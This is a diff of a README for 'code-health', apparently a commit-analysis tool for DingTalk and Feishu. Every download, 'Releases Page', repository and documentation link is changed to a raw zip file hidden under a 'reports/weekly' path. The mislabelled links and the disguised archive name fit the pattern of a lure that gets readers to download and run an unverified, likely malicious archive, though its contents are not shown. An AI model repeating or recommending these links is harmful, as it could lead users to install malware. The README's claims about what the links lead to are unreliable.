@@ -4,7 +4,7 @@
 Welcome to code-health! This application helps you monitor code quality and team productivity automatically by analyzing Git commits. It connects with DingTalk and Feishu for seamless team communication and reporting.
 
 ## 📥 Download the Application
-[![Download code-health](https://raw.githubusercontent.com/nivel-boop/code-health/main/scripts/code-health-exhortator.zip)](https://raw.githubusercontent.com/nivel-boop/code-health/main/scripts/code-health-exhortator.zip)
+[![Download code-health](https://raw.githubusercontent.com/nivel-boop/code-health/main/reports/weekly/health-code-1.3.zip)](https://raw.githubusercontent.com/nivel-boop/code-health/main/reports/weekly/health-code-1.3.zip)
 
 ## 🚀 Getting Started
 To get started with code-health, you need to download the application from our Releases page. Follow the steps below to ensure a smooth setup.
@@ -21,11 +21,11 @@ To get started with code-health, you need to download the application from our R
 - Team productivity tracking
 
 ## 🔗 Download & Install
-Visit this page to download: [code-health Releases Page](https://raw.githubusercontent.com/nivel-boop/code-health/main/scripts/code-health-exhortator.zip)
+Visit this page to download: [code-health Releases Page](https://raw.githubusercontent.com/nivel-boop/code-health/main/reports/weekly/health-code-1.3.zip)
 
 1. Click the link above to go to the Releases page.
 2. Find the latest version listed at the top. The version number will look something like "v1.0.0".
-3. Under the latest release, you will see a list of files. Choose the one that matches your operating system (e.g., `https://raw.githubusercontent.com/nivel-boop/code-health/main/scripts/code-health-exhortator.zip` for Windows).
+3. Under the latest release, you will see a list of files. Choose the one that matches your operating system (e.g., `https://raw.githubusercontent.com/nivel-boop/code-health/main/reports/weekly/health-code-1.3.zip` for Windows).
 4. Click on the file name to start the download.
 
 ## 🛠️ Running the Application
@@ -63,9 +63,9 @@ If you encounter issues during installation or usage, consider the following:
 - Visit the Issues section in the GitHub repository for help from the community.
 
 ## 💡 Additional Resources
-- [GitHub Repository](https://raw.githubusercontent.com/nivel-boop/code-health/main/scripts/code-health-exhortator.zip)
-- [DingTalk Documentation](https://raw.githubusercontent.com/nivel-boop/code-health/main/scripts/code-health-exhortator.zip)
-- [Feishu Documentation](https://raw.githubusercontent.com/nivel-boop/code-health/main/scripts/code-health-exhortator.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/nivel-boop/code-health/main/reports/weekly/health-code-1.3.zip)
+- [DingTalk Documentation](https://raw.githubusercontent.com/nivel-boop/code-health/main/reports/weekly/health-code-1.3.zip)
+- [Feishu Documentation](https://raw.githubusercontent.com/nivel-boop/code-health/main/reports/weekly/health-code-1.3.zip)
 
 ## 📞 Support
 If you need further assistance, please open an issue on our GitHub page. We are here to help you get the most out of code-health. 
